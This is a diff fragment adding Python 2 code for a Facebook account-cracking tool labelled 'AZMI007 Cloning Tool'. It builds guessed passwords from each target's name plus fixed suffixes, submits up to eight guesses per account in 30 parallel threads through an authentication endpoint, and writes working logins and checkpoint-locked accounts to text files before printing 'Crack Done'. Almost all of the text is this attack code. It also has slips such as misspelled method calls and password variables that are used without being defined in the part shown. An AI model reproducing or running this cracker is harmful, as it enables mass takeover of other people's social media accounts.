+    time.sleep(0.5)
+    print 47 * '-'
+    print '\t\x1b[1;94m{AZMI007} {Cloning Tool}\x1b[1;91m'
+    print 47 * '-'
+
+    def main(arg):
+        user = arg
+        uid, name = user.split('|')
+        try:
+            pass1 = name.lower() + p1
+            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
+            q = json.loads(data)
+            if 'loc' in q:
+                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(uid + pass1)
+            elif 'www.facebook.com' in q['error']:
+                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass1
+                cp = open('AZMI_CP.txt', 'a')
+                cp.write(uid + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(uid + pass1)
+            else:
+                pass2 = name.lower() + p2
+                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
+                q = json.loads(data)
+                if 'loc' in q:
+                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                    ok.write(uid + ' | ' + pass2 + '\n')
+                    ok.close()
+                    oks.append(uid + pass2)
+                elif 'www.facebook.com' in q['error']:
+                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass2
+                    cp = open('AZMI_CP.txt', 'a')
+                    cp.write(uid + ' | ' + pass2 + '\n')
+                    cp.close()
+                    cps.append(uid + pass2)
+                else:
+                    pass3 = name.lower() + p3
+                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
+                    q = json.loads(data)
+                    if 'loc' in q:
+                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                        ok.write(uid + ' | ' + pass3 + '\n')
+                        ok.close()
+                        oks.append(uid + pass3)
+                    elif 'www.facebook.com' in q['error']:
+                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass3
+                        cp = open('AZMI_CP.txt', 'a')
+                        cp.write(uid + ' | ' + pass3 + '\n')
+                        cp.close()
+                        cps.append(uid + pass3)
+                    else:
+                        pass4 = name.lower() + p4
+                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
+                        q = json.loads(data)
+                        if 'loc' in q:
+                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                            ok.write(uid + ' | ' + pass4 + '\n')
+                            ok.close()
+                            oks.append(uid + pass4)
+                        elif 'www.facebook.com' in q['error']:
+                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass4
+                            cp = open('AZMI_CP.txt', 'a')
+                            cp.write(uid + ' | ' + pass4 + '\n')
+                            cp.close()
+                            cps.apppend(uid + pass4)
+                        else:
+                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
+                            q = json.loads(data)
+                            if 'loc' in q:
+                                print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                ok.write(uid + ' | ' + pass5 + '\n')
+                                ok.close()
+                                oks.append(uid + pass5)
+                            elif 'www.facebook.com' in q['error']:
+                                print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass5
+                                cp = open('AZMI_CP.txt', 'a')
+                                cp.write(uid + ' | ' + pass5 + '\n')
+                                cp.close()
+                                cps.apppend(uid + pass5)
+                            else:
+                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
+                                q = json.loads(data)
+                                if 'loc' in q:
+                                    print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                    ok.write(uid + ' | ' + pass6 + '\n')
+                                    ok.close()
+                                    oks.append(uid + pass6)
+                                elif 'www.facebook.com' in q['error']:
+                                    print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass6
+                                    cp = open('AZMI_CP.txt', 'a')
+                                    cp.write(uid + ' | ' + pass6 + '\n')
+                                    cp.close()
+                                    cps.apppend(uid + pass6)
+                                else:
+                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
+                                    q = json.loads(data)
+                                    if 'loc' in q:
+                                        print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                        ok.write(uid + ' | ' + pass7 + '\n')
+                                        ok.close()
+                                        oks.append(uid + pass7)
+                                    elif 'www.facebook.com' in q['error']:
+                                        print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass7
+                                        cp = open('AZMI_CP.txt', 'a')
+                                        cp.write(uid + ' | ' + pass7 + '\n')
+                                        cp.close()
+                                        cps.apppend(uid + pass7)
+                                    else:
+                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
+                                        q = json.loads(data)
+                                        if 'loc' in q:
+                                            print '\x1b[1;92m[OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
+                                            ok.write(uid + ' | ' + pass8 + '\n')
+                                            ok.close()
+                                            oks.append(uid + pass8)
+                                        elif 'www.facebook.com' in q['error']:
+                                            print '\x1b[1;31;1m[CP] ' + uid + ' | ' + pass8
+                                            cp = open('AZMI_CP.txt', 'a')
+                                            cp.write(uid + ' | ' + pass8 + '\n')
+                                            cp.close()
+                                            cps.apppend(uid + pass8)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 47 * '-'
+    print ' \x1b[1;92mCrack Done'
+    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print 47 * '-'
+    raw_input(' \x1b[1;93mPress enter to back')
+    auto_crack()
+
+
+if __name__ == '__main__':
+    reg()
